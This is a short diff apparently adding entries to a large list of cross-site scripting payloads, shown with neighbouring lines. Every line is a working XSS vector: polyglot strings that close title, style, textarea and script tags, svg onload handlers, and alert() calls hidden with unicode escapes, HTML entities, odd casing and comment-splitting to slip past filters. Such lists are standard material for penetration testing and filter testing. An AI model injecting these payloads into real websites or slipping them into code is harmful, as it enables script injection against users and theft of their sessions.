@@ -1203,3 +1203,6 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+//+/onmo
 <svg><script /* /*/*/*>\u0061l\u0065rt`X`
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 <SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
+</script/x><svg onload=alert(domain)>
+<svg><script>a<!>le<!---->rt<?>(1</>)</script>
+<!><!----><?></>
